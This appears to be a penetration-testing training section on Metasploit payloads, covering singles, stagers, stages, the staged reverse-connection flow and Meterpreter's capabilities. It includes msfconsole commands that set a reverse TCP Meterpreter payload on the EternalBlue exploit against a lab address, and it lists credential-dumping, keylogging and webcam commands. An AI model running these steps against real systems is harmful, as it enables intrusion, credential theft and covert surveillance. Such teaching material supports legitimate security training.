# Payloads

A payload in Metasploit is the code delivered to and executed on the target system after a vulnerability has been successfully exploited. While the exploit module's job is to abuse the vulnerability and gain code execution, the payload's job is to define what that execution produces, most commonly a reverse shell or Meterpreter session that returns interactive access to the operator. Whether a payload is staged is indicated directly by its name: a forward slash separating components denotes a staged payload, while an underscore joining them denotes a single (stageless) payload.

For example:
- `windows/shell_bind_tcp` is a **single** payload with no stage
- `windows/shell/bind_tcp` consists of a **stager** (`bind_tcp`) and a **stage** (`shell`)

## The Three Payload Types

### Singles

A single payload bundles the exploit and the complete shellcode for the intended task into one self-contained unit. Nothing additional needs to be downloaded or staged after execution. Singles are more stable by design because all required code is present from the outset, but their size can be a limitation: some vulnerabilities impose strict constraints on how many bytes the initial exploit can deliver, which may exceed what a single payload can fit within.

Singles are appropriate when the task is simple and discrete, such as adding a user account, executing a specific command, or spawning a basic shell. Because they carry everything they need, they function even in environments where a reliable callback channel cannot be guaranteed after the initial execution.

### Stagers

Stager payloads are small, reliable components whose only purpose is to establish a communication channel between the target machine and the operator's listener and then read the subsequent stage into memory. They are deliberately minimal to maximise compatibility with size-constrained exploits.

Metasploit automatically selects the most appropriate stager for a given scenario. Two variants exist for Windows targets:

- **NX stagers:** Compatible with CPUs that enforce Data Execution Prevention (DEP); use `VirtualAlloc` to mark memory regions as executable before writing shellcode. These are the default on modern Windows systems.
- **NO-NX stagers:** Smaller and simpler, but incompatible with DEP-enabled systems.

The default configuration selects an NX stager for Windows 7 and above.

### Stages

Stages are the larger payload components downloaded by the stager once the communication channel is in place. Because they are transferred after the initial connection is established, they have no size constraints and can deliver advanced functionality including Meterpreter, VNC injection, and interactive PowerShell sessions.

Large stages are handled through an intermediate step known as a middle stager. A single `recv()` call is unreliable for large payloads over a network, so the stager first receives a small middle stager, which then performs a full download of the complete stage. This staged download process is also better suited to RWX (read-write-execute) memory scenarios.

## Staged Payload Flow

The end-to-end execution of a staged payload against a Windows target follows this sequence:

1. **Stage0** (the stager) is delivered via the exploit to the vulnerable service. Its sole function is to initialise a reverse connection back to the operator's machine and wait for the next payload component.
2. The operator's handler receives the Stage0 connection and sends **Stage1** (the full stage) over the established channel.
3. Stage1 is written into memory on the target and executed, providing the interactive Meterpreter or shell session.

Reverse connections are more reliable than bind connections in most real-world environments because they originate from the target outbound, which most firewalls treat with less scrutiny than unsolicited inbound traffic.

## The Meterpreter Payload

Meterpreter is Metasploit's most capable and widely used payload. It uses reflective DLL injection to load `metsrv.dll` directly into the memory of an existing process on the target without creating a new process or writing any files to disk. This means it leaves no artefacts on the filesystem and produces no new process entries that would be immediately obvious during basic monitoring. The session communicates over an encrypted TLS channel, and extensions can be loaded and unloaded dynamically without restarting the session.

Key Meterpreter capabilities available immediately after session establishment:

| Category | Commands |
|---|---|
| **File system** | `ls`, `cd`, `download`, `upload`, `search`, `edit` |
| **Networking** | `ifconfig`, `arp`, `netstat`, `portfwd`, `route` |
| **System** | `getuid`, `getpid`, `ps`, `kill`, `sysinfo`, `shell`, `getsid`, `getprivs` |
| **Privilege escalation** | `getsystem`, `steal_token`, `impersonate_token` |
| **Credential extraction** | `hashdump` |
| **User interface** | `screenshot`, `screenshare`, `keyscan_start`, `keyscan_dump` |
| **Webcam and audio** | `webcam_snap`, `webcam_stream`, `record_mic` |
| **Post modules** | `run <post/module>` |

Standard Windows commands such as `whoami` are not available at the Meterpreter prompt. Use Meterpreter-native equivalents such as `getuid` to identify the current user context, then drop into a Windows command shell with `shell` when native `cmd.exe` commands are needed.

## Searching and Selecting Payloads

Running `show payloads` from within a loaded exploit module filters the list automatically to payloads compatible with the module's detected target platform. The full list contains over 560 entries and is difficult to navigate without filtering. Chain `grep` commands to narrow results progressively:

```bash
# List all Meterpreter payloads for the current module
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads

# Count matching results
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads
[*] 14

# Narrow further to reverse TCP variants only
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp     normal  No  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4 normal  No  Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid normal No  Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
```

Set the chosen payload using its index number:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
payload => windows/x64/meterpreter/reverse_tcp
```

Setting the payload adds its configuration options to the `show options` output. For a reverse TCP payload, `LHOST` and `LPORT` become required fields in addition to the exploit module's own options. Confirm the attack machine IP with `ifconfig` directly from within `msfconsole`:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > ifconfig
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

## Common Windows Payload Types

| Payload | Description |
|---|---|
| `generic/shell_bind_tcp` | Generic multi-use bind shell over TCP |
| `generic/shell_reverse_tcp` | Generic multi-use reverse shell over TCP |
| `windows/x64/exec` | Executes a single arbitrary command |
| `windows/x64/shell_reverse_tcp` | Stageless reverse shell for Windows x64 |
| `windows/x64/shell/reverse_tcp` | Staged reverse shell (stager + stage) for Windows x64 |
| `windows/x64/meterpreter/reverse_tcp` | Staged Meterpreter over reverse TCP for Windows x64 |
| `windows/x64/meterpreter_reverse_tcp` | Stageless Meterpreter over reverse TCP for Windows x64 |
| `windows/x64/powershell/reverse_tcp` | Interactive PowerShell session via staged reverse TCP |
| `windows/x64/vncinject/reverse_tcp` | VNC server injection via staged reverse TCP |

Payloads are not limited to Windows and desktop platforms. The Metasploit library includes payloads targeting Android, Apple iOS, AIX, Linux (across multiple architectures), mainframe, NetWare, and network device vendors such as Cisco. Custom payloads for scenarios not covered by the built-in library can be generated with MSFvenom, which is covered in a later section of this module.
